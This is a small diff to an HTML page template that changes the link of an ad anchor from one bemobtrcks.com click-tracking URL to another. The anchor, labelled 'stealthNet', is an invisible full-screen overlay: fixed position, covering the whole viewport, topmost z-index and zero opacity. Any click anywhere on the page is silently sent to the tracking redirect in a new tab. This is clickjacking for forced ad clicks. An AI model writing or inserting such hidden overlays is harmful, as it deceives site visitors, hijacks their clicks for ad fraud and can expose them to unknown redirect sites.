@@ -2,7 +2,8 @@
   <div class="home-b">
 <!--    <div id="container-d1debede50ec7d8df5940dc07088499f"></div>-->
     <img src="../assets/adsimg/a.png" style="margin: 0 auto;" alt="">
-    <a href="https://h4imw.bemobtrcks.com/click"
+    <!--  https://h4imw.bemobtrcks.com/click  -->
+    <a href="https://6njvi.bemobtrcks.com/click"
        target="_blank"
        ref="stealthNet"
        style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; opacity: 0; cursor: pointer;"
